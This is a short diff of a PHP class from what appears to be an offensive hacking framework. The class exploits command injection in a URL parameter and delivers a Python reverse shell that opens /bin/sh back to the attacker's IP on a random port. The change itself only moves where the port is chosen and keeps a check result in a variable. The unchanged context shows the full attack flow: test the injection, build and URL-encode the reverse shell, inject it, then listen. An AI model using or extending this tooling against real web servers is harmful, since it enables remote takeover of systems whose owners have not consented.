@@ -92,12 +92,14 @@ class PARAM4COM extends URL{
         $this->ssTitre(__FUNCTION__);
         $shell = "/bin/sh";
         $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
         
         if(!empty($template)){
             $cmd_value = $this->param2url($template, $cmd);
-            if (!empty($this->param2check($user_agent,$cmd_value,$filter))) {
+            $rst_id = $this->param2check($user_agent,$cmd_value,$filter);
+            if (!empty($rst_id)) {
                 
-                $attacker_port = rand(1024,65535);
+                
                 $cmd_rev_nc = $this->rev8python($attacker_ip, $attacker_port, $shell);
                 $cmd_rev_nc = $this->url2encode($cmd_rev_nc);
                 $url = $this->param2url($template, $cmd_rev_nc);
@@ -107,6 +109,7 @@ class PARAM4COM extends URL{
                
                 $this->port2read(base64_encode($template_rec));
                 $this->service4lan($template_rec, $data, $attacker_port, $filter);
+                
                 
             }
             $this->pause();
